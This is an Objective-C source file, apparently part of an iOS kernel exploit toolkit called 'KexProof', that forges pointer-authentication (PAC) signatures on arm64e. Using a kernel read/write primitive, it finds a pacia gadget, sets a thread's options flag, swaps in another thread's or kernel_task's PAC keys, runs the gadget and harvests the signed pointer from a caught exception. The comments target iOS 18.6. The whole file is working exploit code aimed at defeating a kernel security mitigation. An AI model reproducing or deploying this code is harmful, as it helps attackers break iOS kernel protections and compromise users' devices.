// pac.m — PAC forging port (lara pac.m) for KexProof.
// remotepac: hijack a local thread, swap its PAC keys for the remote thread's
// keys (via kernel write), run a pacia gadget — yields a signature valid for
// the remote process. With kernel_task's keys this forges kernel PAC.
#import "pac.h"
#import "rc.h"
#import "KPDump.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

extern mach_port_t mach_task_self_;

static uint64_t g_rc_paciagadget = 0;

uint64_t kp_pac_nativestrip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t kp_pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t val = kp_pac_nativestrip(ptr);
    __asm__ volatile (
        "mov x16, %[ptr]\n"
        "mov x17, %[mod]\n"
        ".long 0xDAC10230\n"   // pacia x16, x17
        "mov %[out], x16\n"
        : [out] "=r"(val)
        : [ptr] "r"(val), [mod] "r"(modifier)
        : "x16", "x17"
    );
    return val;
}

uint64_t kp_ptrauthstrdisc(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

bool kp_pacsignworks(void)
{
    void *pcSymbol = dlsym(RTLD_DEFAULT, "getpid");
    if (!pcSymbol) pcSymbol = (void *)&kp_pacsignworks;
    uint64_t pcprobe = kp_pac_nativestrip((uint64_t)pcSymbol);
    uint64_t pcsigned = kp_pacia(pcprobe, kp_ptrauthstrdisc("pc"));
    return pcsigned != pcprobe;
}

uint64_t kp_findpacia(void)
{
    const uint32_t gadgetopcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    // scan our own executable for the pacia+mov+ret gadget
    extern int _dyld_image_count(void);
    extern const char *_dyld_get_image_name(unsigned);
    extern const void *_dyld_get_image_header(unsigned);
    for (unsigned i = 0; i < (unsigned)_dyld_image_count(); i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, "KexProof")) continue;
        uint8_t *base = (uint8_t *)_dyld_get_image_header(i);
        if (!base) continue;
        for (size_t off = 0; off + sizeof(gadgetopcodes) <= 0x200000; off += 4) {
            if (memcmp(base + off, gadgetopcodes, sizeof(gadgetopcodes)) == 0)
                return (uint64_t)(base + off);
        }
    }
    return 0;
}

// exception port helpers (exc.m port)
mach_port_t kp_createexcport(void);
bool kp_waitexc(mach_port_t excport, kp_excmsg *excbuf, int timeout);
bool kp_statereply(kp_excmsg *exc, kp_arm_thread_state64_internal *state);

// thread helpers (thread.m port)
bool kp_threadsetstate(mach_port_t machthread, uint64_t threadaddr, kp_arm_thread_state64_internal *state);
void kp_threadsetpac(uint64_t threadaddr, uint64_t keya, uint64_t keyb);

static void paclog(NSString *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    extern void KPLogDirect(const char *);
    KPLogDirect([s UTF8String]); // зеркало в kexproof-live.log (шеринг-кнопка)
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
    NSData *d = [[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
    if (!h) { [d writeToFile:p atomically:NO]; return; }
    [h seekToEndOfFile];
    [h writeData:d];
    [h closeFile];
}

static void kp_paccleanup(mach_port_t pacthread, mach_port_t excport, void *stack)
{
    if (pacthread != MACH_PORT_NULL) thread_terminate(pacthread);
    if (excport != MACH_PORT_NULL) mach_port_destruct(mach_task_self_, excport, 0, 0);
    if (stack) free(stack);
}

uint64_t kp_remotepac(uint64_t remotethreadaddr, uint64_t address, uint64_t modifier)
{
    if (!g_rc_paciagadget) {
        uint64_t gadgetaddr = kp_findpacia();
        if (gadgetaddr == 0) return (uint64_t)-1;
        g_rc_paciagadget = gadgetaddr;
    }

    address = kp_pac_nativestrip(address);

    uint64_t keya = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_ROP_PID);
    uint64_t keyb = kp_rc_kread64(remotethreadaddr + KP_OFF_THREAD_MACHINE_JOP_PID);
    paclog(@"    [rp] remote keys: a=%#llx b=%#llx", keya, keyb);

    mach_port_t pacthread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacthread);
    if (kr != KERN_SUCCESS) { paclog(@"    [rp] thread_create kr=%#x", kr); return (uint64_t)-1; }

    void *stack = malloc(0x4000);
    memset(stack, 0, 0x4000);
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    kp_arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    // iOS 18.6 arm64e: fetching a PAC-signed pc is FATAL (kernel SIGKILLs the
    // task, no exception delivery). Raw canonical pc — the kernel signs the
    // resume ELR itself; pacia then runs under the swapped (remote) keys.
    state.__pc = g_rc_paciagadget;
    // Raw unmapped lr: plain `ret` lands on 0x401 → ordinary EXC_BAD_ACCESS
    // (not PAC-flavored) → catchable by our exception port.
    state.__lr = KP_FAKE_LR;
    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacthread;
    state.__x[16] = address;
    state.__x[17] = modifier;
    paclog(@"    [rp] state: pc=%#llx lr=%#llx sp=%#llx", state.__pc, state.__lr, state.__sp);

    mach_port_t excport = kp_createexcport();
    if (!excport) { paclog(@"    [rp] excport FAIL"); kp_paccleanup(pacthread, MACH_PORT_NULL, stack); return 0; }

    kr = thread_set_exception_ports(pacthread, EXC_MASK_BAD_ACCESS, excport, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) { paclog(@"    [rp] set_exc_ports kr=%#x", kr); kp_paccleanup(pacthread, excport, stack); return 0; }

    // resolve pacthread's kernel thread_t VA first (lara order): threadsetstate
    // needs it for the TH_IN_MACH_EXCEPTION dance, then we swap keys on it.
    uint64_t pacKVA = [KPDump rcResolveThreadKVA:pacthread];
    if (!pacKVA) { paclog(@"    [rp] pacKVA resolve FAIL"); kp_paccleanup(pacthread, excport, stack); return 0; }

    uint64_t oa = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
    uint64_t ob = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
    paclog(@"    [rp] pacthread orig keys: a=%#llx b=%#llx — %@", oa, ob,
           (oa == keya && ob == keyb) ? @"совпадают с main (per-task)" : @"ДРУГИЕ (per-thread!)");

    uint16_t opt0 = kp_rc_kread16(pacKVA + KP_OFF_THREAD_OPTIONS);
    kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0 | KP_TH_IN_MACH_EXCEPTION);
    uint16_t opt1 = kp_rc_kread16(pacKVA + KP_OFF_THREAD_OPTIONS);
    paclog(@"    [rp] options: %#x → %#x (флаг %@)", opt0, opt1,
           (opt1 & KP_TH_IN_MACH_EXCEPTION) ? @"ЗАПИСАЛСЯ" : @"НЕ ПРИЛИП!");

    kr = thread_set_state(pacthread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
    paclog(@"    [rp] thread_set_state kr=%#x", kr);
    kp_rc_kwrite16(pacKVA + KP_OFF_THREAD_OPTIONS, opt0);
    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }

    // swap pacthread's PAC keys for the remote thread's keys
    kp_threadsetpac(pacKVA, keya, keyb);
    uint64_t ra = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_ROP_PID);
    uint64_t rb = kp_rc_kread64(pacKVA + KP_OFF_THREAD_MACHINE_JOP_PID);
    paclog(@"    [rp] keys после swap: a=%#llx b=%#llx — %@", ra, rb,
           (ra == keya && rb == keyb) ? @"прилипли" : @"НЕ ПРИЛИПЛИ!");

    kr = thread_resume(pacthread);
    paclog(@"    [rp] resume kr=%#x — жду exception…", kr);
    if (kr != KERN_SUCCESS) { kp_paccleanup(pacthread, excport, stack); return 0; }

    kp_excmsg exc;
    memset(&exc, 0, sizeof(exc));
    if (!kp_waitexc(excport, &exc, 100)) {
        paclog(@"    [rp] waitexc TIMEOUT (поток не упал за 100мс — подпись прошла?)");
        kp_paccleanup(pacthread, excport, stack);
        return 0;
    }
    paclog(@"    [rp] exception: type=%u code=[%#llx %#llx] pc=%#llx lr=%#llx x16=%#llx x17=%#llx",
           exc.exception, exc.codeFirst, exc.codeSecond,
           exc.threadState.__pc, exc.threadState.__lr,
           exc.threadState.__x[16], exc.threadState.__x[17]);

    uint64_t signedAddress = exc.threadState.__x[16];

    // eject-ответ: гасим exception, отправляя поток в pthread_exit. Сырой
    // canonical pc — ядро само подпишет ELR при возврате из exception.
    void *pe = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (pe) {
        kp_arm_thread_state64_internal st2 = exc.threadState;
        st2.__x[0] = 0;
        st2.__pc = kp_pac_nativestrip((uint64_t)pe);
        st2.__lr = KP_FAKE_LR;
        bool rok = kp_statereply(&exc, &st2);
        paclog(@"    [rp] reply(eject→pthread_exit): %@", rok ? @"OK" : @"FAIL");
        usleep(3000);
    }
    pacthread = MACH_PORT_NULL; // поток сам умер в pthread_exit (или уже мёртв)
    kp_paccleanup(MACH_PORT_NULL, excport, stack);
    return signedAddress;
}
